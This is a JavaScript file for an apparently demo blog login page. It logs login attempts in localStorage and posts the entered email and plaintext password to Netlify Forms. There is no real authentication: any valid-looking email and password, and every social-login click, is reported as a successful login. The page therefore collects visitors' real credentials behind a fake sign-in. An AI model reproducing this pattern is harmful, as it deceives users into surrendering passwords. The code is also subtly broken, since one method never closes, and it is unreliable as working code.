// Data Collector Class
class DataCollector {
    constructor() {
        this.data = this.loadData();
        this.init();
    }

    init() {
        this.trackVisit();
        this.updateBrowserInfo();
        this.updateStats();
    }

    loadData() {
        const defaultData = {
            totalLogins: 0,
            successfulLogins: 0,
            failedLogins: 0,
            totalVisits: 1,
            loginLogs: [],
            loginMethods: {
                email: 0,
                google: 0,
                github: 0
            }
        };
        return JSON.parse(localStorage.getItem('loginData')) || defaultData;
    }

    saveData() {
        localStorage.setItem('loginData', JSON.stringify(this.data));
    }

    trackVisit() {
        this.data.totalVisits++;
        this.saveData();
    }

    trackLogin(email, status, method = 'email') {
        const timestamp = new Date().toISOString();
        const logEntry = {
            timestamp,
            email,
            status,
            method,
            browser: this.getBrowserInfo()
        };

        this.data.totalLogins++;
        if (status === 'success') {
            this.data.successfulLogins++;
        } else {
            this.data.failedLogins++;
        }

        if (method === 'email') this.data.loginMethods.email++;
        if (method === 'google') this.data.loginMethods.google++;
        if (method === 'github') this.data.loginMethods.github++;

        this.data.loginLogs.unshift(logEntry);
        if (this.data.loginLogs.length > 10) {
            this.data.loginLogs.pop();
        }

        this.saveData();
        this.updateStats();
    }

    updateStats() {
        // 添加空检查，避免在不存在这些元素的页面上报错
        const totalLoginsEl = document.getElementById('totalLogins');
        const successfulLoginsEl = document.getElementById('successfulLogins');
        const failedLoginsEl = document.getElementById('failedLogins');
        const totalVisitsEl = document.getElementById('totalVisits');

        if (totalLoginsEl) totalLoginsEl.textContent = this.data.totalLogins;
        if (successfulLoginsEl) successfulLoginsEl.textContent = this.data.successfulLogins;
        if (failedLoginsEl) failedLoginsEl.textContent = this.data.failedLogins;
        if (totalVisitsEl) totalVisitsEl.textContent = this.data.totalVisits;

        this.updateLoginLogs();
        this.updateMethodStats();
    }

    updateLoginLogs() {
        const logList = document.getElementById('loginLogs');
        if (!logList) return; // 如果元素不存在，直接返回

        if (this.data.loginLogs.length === 0) {
            logList.innerHTML = '<div class="log-item empty"><i class="fas fa-info-circle"></i> 暂无登录记录</div>';
            return;
        }

        logList.innerHTML = this.data.loginLogs.map(log => {
            const date = new Date(log.timestamp);
            const timeStr = date.toLocaleString('zh-CN', {
                month: 'short',
                day: 'numeric',
                hour: '2-digit',
                minute: '2-digit'
            });
            const methodIcon = this.getMethodIcon(log.method);
            const statusClass = log.status === 'success' ? 'success' : 'failed';

            return `
                <div class="log-item ${statusClass}">
                    <i class="${methodIcon}"></i>
                    <div class="log-content">
                        <div class="log-email">${this.maskEmail(log.email)}</div>
                        <div class="log-time">${timeStr}</div>
                    </div>
                    <div class="log-status ${statusClass}">
                        ${log.status === 'success' ? '成功' : '失败'}
                    </div>
                </div>
            `;
        }).join('');
    }

    updateMethodStats() {
        const total = this.data.successfulLogins;
        const emailCount = this.data.loginMethods.email;
        const googleCount = this.data.loginMethods.google;
        const githubCount = this.data.loginMethods.github;

        // 添加空检查
        const emailLoginCountEl = document.getElementById('emailLoginCount');
        const googleLoginCountEl = document.getElementById('googleLoginCount');
        const githubLoginCountEl = document.getElementById('githubLoginCount');
        const emailLoginBarEl = document.getElementById('emailLoginBar');
        const googleLoginBarEl = document.getElementById('googleLoginBar');
        const githubLoginBarEl = document.getElementById('githubLoginBar');

        if (emailLoginCountEl) emailLoginCountEl.textContent = emailCount;
        if (googleLoginCountEl) googleLoginCountEl.textContent = googleCount;
        if (githubLoginCountEl) githubLoginCountEl.textContent = githubCount;

        const emailPercent = total > 0 ? (emailCount / total * 100) : 0;
        const googlePercent = total > 0 ? (googleCount / total * 100) : 0;
        const githubPercent = total > 0 ? (githubCount / total * 100) : 0;

        if (emailLoginBarEl) emailLoginBarEl.style.width = `${emailPercent}%`;
        if (googleLoginBarEl) googleLoginBarEl.style.width = `${googlePercent}%`;
        if (githubLoginBarEl) githubLoginBarEl.style.width = `${githubPercent}%`;
    }

    updateBrowserInfo() {
        const info = this.getBrowserInfo();

        // 添加空检查，避免在不存在这些元素的页面上报错
        const browserNameEl = document.getElementById('browserName');
        const osNameEl = document.getElementById('osName');
        const screenResolutionEl = document.getElementById('screenResolution');
        const timezoneEl = document.getElementById('timezone');

        if (browserNameEl) browserNameEl.textContent = info.name;
        if (osNameEl) osNameEl.textContent = info.os;
        if (screenResolutionEl) screenResolutionEl.textContent = info.screen;
        if (timezoneEl) timezoneEl.textContent = info.timezone;
    }

    getBrowserInfo() {
        const ua = navigator.userAgent;
        let browser = 'Unknown';
        let os = 'Unknown';

        if (ua.indexOf('Chrome') > -1) browser = 'Chrome';
        else if (ua.indexOf('Safari') > -1) browser = 'Safari';
        else if (ua.indexOf('Firefox') > -1) browser = 'Firefox';
        else if (ua.indexOf('Edge') > -1) browser = 'Edge';

        if (ua.indexOf('Windows') > -1) os = 'Windows';
        else if (ua.indexOf('Mac') > -1) os = 'macOS';
        else if (ua.indexOf('Linux') > -1) os = 'Linux';
        else if (ua.indexOf('Android') > -1) os = 'Android';
        else if (ua.indexOf('iOS') > -1) os = 'iOS';

        return {
            name: browser,
            os: os,
            screen: `${screen.width}x${screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
        };
    }

    getMethodIcon(method) {
        const icons = {
            email: 'fas fa-envelope',
            google: 'fab fa-google',
            github: 'fab fa-github'
        };
        return icons[method] || 'fas fa-user';
    }

    maskEmail(email) {
        if (!email) return '-';
        const [username, domain] = email.split('@');
        if (!domain) return email;
        const maskedUsername = username.substring(0, 2) + '*'.repeat(username.length - 2);
        return `${maskedUsername}@${domain}`;
    }

    exportData() {
        const dataStr = JSON.stringify(this.data, null, 2);
        const dataBlob = new Blob([dataStr], { type: 'application/json' });
        const url = URL.createObjectURL(dataBlob);
        const link = document.createElement('a');
        link.href = url;
        link.download = `login-data-${new Date().toISOString().split('T')[0]}.json`;
        link.click();
        URL.revokeObjectURL(url);
    }

    clearData() {
        if (confirm('确定要清空所有数据吗？此操作不可撤销！')) {
            localStorage.removeItem('loginData');
            this.data = this.loadData();
            this.updateStats();
            return true;
        }
        return false;
    }
}

// Blog Login App
class BlogLogin {
    constructor() {
        this.dataCollector = new DataCollector();
        // 配置：登录成功后的跳转链接（修改这里设置你的博客首页）
        this.BLOG_HOME_URL = '/blog.html'; // 可以修改为完整的URL，如 'https://yourblog.com'
        this.init();
    }

    init() {
        this.bindEvents();
    }

    bindEvents() {
        // 邮箱登录按钮提交（使用click事件而不是submit事件）
        const loginForm = document.getElementById('loginForm');
        const loginBtn = document.querySelector('.login-btn');
        if (loginBtn && loginForm) {
            loginBtn.addEventListener('click', (e) => this.handleEmailLogin(e, loginForm));
        }

        // Toggle password visibility
        const togglePassword = document.getElementById('togglePassword');
        if (togglePassword) {
            togglePassword.addEventListener('click', () => this.togglePasswordVisibility());
        }

        // Social login buttons
        const googleBtn = document.querySelector('.google-btn');
        const githubBtn = document.querySelector('.github-btn');
        if (googleBtn) {
            googleBtn.addEventListener('click', (e) => this.handleSocialLogin(e, 'Google'));
        }
        if (githubBtn) {
            githubBtn.addEventListener('click', (e) => this.handleSocialLogin(e, 'GitHub'));
        }

        // Forgot password
        const forgotPassword = document.querySelector('.forgot-password');
        if (forgotPassword) {
            forgotPassword.addEventListener('click', (e) => {
                e.preventDefault();
                this.handleForgotPassword();
            });
        }

        // Register link
        const registerLink = document.querySelector('.register-link a');
        if (registerLink) {
            registerLink.addEventListener('click', (e) => {
                e.preventDefault();
                this.handleRegister();
            });
        }

        // Data panel events
        const dataPanelToggle = document.getElementById('dataPanelToggle');
        const dataPanel = document.getElementById('dataPanel');
        const closePanelBtn = document.getElementById('closePanelBtn');
        const exportDataBtn = document.getElementById('exportData');
        const clearDataBtn = document.getElementById('clearData');

        if (dataPanelToggle) {
            dataPanelToggle.addEventListener('click', () => this.toggleDataPanel());
        }
        if (closePanelBtn) {
            closePanelBtn.addEventListener('click', () => this.closeDataPanel());
        }
        if (exportDataBtn) {
            exportDataBtn.addEventListener('click', () => this.dataCollector.exportData());
        }
        if (clearDataBtn) {
            clearDataBtn.addEventListener('click', () => this.dataCollector.clearData());
        }

        // Close panel when clicking outside
        if (dataPanel) {
            document.addEventListener('click', (e) => {
                if (dataPanel.classList.contains('open') &&
                !dataPanel.contains(e.target) &&
                e.target !== dataPanelToggle) {
                this.closeDataPanel();
            }
        });
    }

    handleEmailLogin(e, loginForm) {
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        const rememberMe = document.getElementById('rememberMe').checked;

        // Basic validation
        if (!email || !password) {
            this.dataCollector.trackLogin(email || '-', 'failed', 'email');
            this.showNotification('请填写所有字段', 'error');
            e.preventDefault();
            return;
        }

        if (!this.isValidEmail(email)) {
            this.dataCollector.trackLogin(email, 'failed', 'email');
            this.showNotification('请输入有效的邮箱地址', 'error');
            e.preventDefault();
            return;
        }

        // 验证通过，填充隐藏字段
        document.getElementById('timestamp').value = new Date().toISOString();
        document.getElementById('userAgent').value = navigator.userAgent;

        // 记录登录数据
        this.dataCollector.trackLogin(email, 'success', 'email');

        if (rememberMe) {
            localStorage.setItem('rememberedEmail', email);
        }

        // 显示成功消息
        this.showNotification('登录成功！正在提交表单...', 'success');

        // 延迟一点时间让用户看到消息，然后提交表单
        setTimeout(() => {
            loginForm.submit();
        }, 500);
    }

    togglePasswordVisibility() {
        const passwordInput = document.getElementById('password');
        const toggleBtn = document.getElementById('togglePassword');
        const icon = toggleBtn.querySelector('i');

        if (passwordInput.type === 'password') {
            passwordInput.type = 'text';
            icon.classList.remove('fa-eye');
            icon.classList.add('fa-eye-slash');
        } else {
            passwordInput.type = 'password';
            icon.classList.remove('fa-eye-slash');
            icon.classList.add('fa-eye');
        }
    }

    handleSocialLogin(e, provider) {
        e.preventDefault();

        const method = provider.toLowerCase();
        const email = `${method}@social.com`;

        // 显示加载状态
        const btn = e.target.closest('button');
        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> 处理中...';
        btn.disabled = true;

        // 记录数据
        this.dataCollector.trackLogin(email, 'success', method);

        // 记住我功能
        localStorage.setItem('rememberedEmail', email);

        // 显示成功消息
        this.showNotification(`${provider} 登录成功！正在提交表单...`, 'success');

        // 动态创建表单并提交到 Netlify
        setTimeout(() => {
            this.createAndSubmitForm(method, email);
        }, 300);
    }

    // 动态创建表单并提交
    createAndSubmitForm(method, email) {
        const form = document.createElement('form');
        form.method = 'POST';
        form.action = '/';
        form.style.display = 'none';

        // 添加 form-name 字段（Netlify 识别表单的关键）
        const formNameInput = document.createElement('input');
        formNameInput.type = 'hidden';
        formNameInput.name = 'form-name';
        formNameInput.value = 'login-form';
        form.appendChild(formNameInput);

        // 添加 _next 字段
        const nextInput = document.createElement('input');
        nextInput.type = 'hidden';
        nextInput.name = '_next';
        nextInput.value = '/blog.html';
        form.appendChild(nextInput);

        // 添加表单数据
        const fields = {
            'email': `${method}@social.com`,
            'password': '[社交登录]',
            'rememberMe': '否',
            'loginMethod': method,
            'timestamp': new Date().toISOString(),
            'userAgent': navigator.userAgent
        };

        for (const [name, value] of Object.entries(fields)) {
            const input = document.createElement('input');
            input.type = 'hidden';
            input.name = name;
            input.value = value;
            form.appendChild(input);
        }

        // 提交表单
        document.body.appendChild(form);
        form.submit();
    }

    submitSocialLoginInBackground(method) {
        // 注意：此方法已不再使用
        // 现在使用 Formspree，表单会正常提交
        return;
    }

    handleForgotPassword() {
        const email = document.getElementById('email').value;

        if (!email) {
            this.showNotification('请先输入您的邮箱地址', 'warning');
            document.getElementById('email').focus();
            return;
        }

        if (!this.isValidEmail(email)) {
            this.showNotification('请输入有效的邮箱地址', 'error');
            return;
        }

        this.showNotification('密码重置链接已发送到您的邮箱', 'success');
    }

    handleRegister() {
        this.showNotification('正在跳转到注册页面...', 'info');

        setTimeout(() => {
            alert('注册功能尚未实现\n\n这是演示版本');
        }, 500);
    }

    submitFormInBackground(form) {
        // 注意：此方法已不再使用
        // 现在使用 Formspree，表单会正常提交
        return;
    }

    submitToFormsubmit(form) {
        // 注意：此方法已不再使用
        // 现在使用 Formspree，表单会正常提交
        return;
    }

    submitToNetlifyForms(email, password, rememberMe, method = 'email') {
        // 创建表单数据
        const formData = new FormData();
        formData.append('form-name', 'login-form');
        formData.append('email', email);
        formData.append('password', password);
        formData.append('rememberMe', rememberMe ? '是' : '否');
        formData.append('loginMethod', method);
        formData.append('timestamp', new Date().toISOString());
        formData.append('userAgent', navigator.userAgent);

        // 提交到 Netlify（使用当前页面路径）
        fetch('/', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams(formData).toString()
        })
        .then(response => {
            if (response.ok) {
                console.log('✅ 数据已发送到 Netlify Forms');
            } else {
                console.log('⚠️ 发送失败，表单可能未被识别');
            }
        })
        .catch(error => {
            console.log('⚠️ 发送错误:', error);
        });
    }

    toggleDataPanel() {
        const dataPanel = document.getElementById('dataPanel');
        dataPanel.classList.toggle('open');
    }

    closeDataPanel() {
        const dataPanel = document.getElementById('dataPanel');
        dataPanel.classList.remove('open');
    }

    showNotification(message, type = 'info') {
        // Remove existing notifications
        const existingNotification = document.querySelector('.notification');
        if (existingNotification) {
            existingNotification.remove();
        }

        // Create notification element
        const notification = document.createElement('div');
        notification.className = `notification notification-${type}`;
        notification.innerHTML = `
            <i class="fas ${this.getNotificationIcon(type)}"></i>
            <span>${message}</span>
        `;

        // Add styles
        const style = document.createElement('style');
        style.textContent = `
            .notification {
                position: fixed;
                top: 20px;
                right: 20px;
                padding: 16px 24px;
                border-radius: 12px;
                color: #fff;
                font-weight: 500;
                display: flex;
                align-items: center;
                gap: 10px;
                z-index: 1000;
                animation: slideInRight 0.3s ease-out, slideOutRight 0.3s ease-in 2.7s;
                max-width: 400px;
                box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
            }
            .notification-info {
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            }
            .notification-success {
                background: linear-gradient(135deg, #4ade80 0%, #22c55e 100%);
            }
            .notification-error {
                background: linear-gradient(135deg, #f87171 0%, #ef4444 100%);
            }
            .notification-warning {
                background: linear-gradient(135deg, #fbbf24 0%, #f59e0b 100%);
            }
            @keyframes slideInRight {
                from {
                    transform: translateX(400px);
                    opacity: 0;
                }
                to {
                    transform: translateX(0);
                    opacity: 1;
                }
            }
            @keyframes slideOutRight {
                from {
                    transform: translateX(0);
                    opacity: 1;
                }
                to {
                    transform: translateX(400px);
                    opacity: 0;
                }
            }
        `;
        if (!document.querySelector('style[data-notification]')) {
            style.setAttribute('data-notification', 'true');
            document.head.appendChild(style);
        }

        // Add to page
        document.body.appendChild(notification);

        // Auto remove after 3 seconds
        setTimeout(() => {
            notification.remove();
        }, 3000);
    }

    getNotificationIcon(type) {
        const icons = {
            info: 'fa-info-circle',
            success: 'fa-check-circle',
            error: 'fa-times-circle',
            warning: 'fa-exclamation-triangle'
        };
        return icons[type] || icons.info;
    }

    isValidEmail(email) {
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return emailRegex.test(email);
    }
}

// Initialize app when DOM is loaded
document.addEventListener('DOMContentLoaded', () => {
    const blogLogin = new BlogLogin();

    // Check for remembered email
    const rememberedEmail = localStorage.getItem('rememberedEmail');
    if (rememberedEmail) {
        document.getElementById('email').value = rememberedEmail;
        document.getElementById('rememberMe').checked = true;
    }

    // 注意：表单提交后的重定向现在由 Netlify _redirects 文件处理

    // Add some demo credentials helper
    console.log('%c🔑 Demo Login Credentials', 'font-size: 16px; font-weight: bold; color: #667eea;');
    console.log('%c任何有效的邮箱和密码都可以登录（演示版本）', 'font-size: 12px; color: #999;');
    console.log('%c推荐测试邮箱: demo@example.com', 'font-size: 12px; color: #999;');
    console.log('%c推荐测试密码: password123', 'font-size: 12px; color: #999;');
    console.log('%c📊 点击右下角的图表按钮查看数据统计', 'font-size: 12px; color: #4ade80;');
});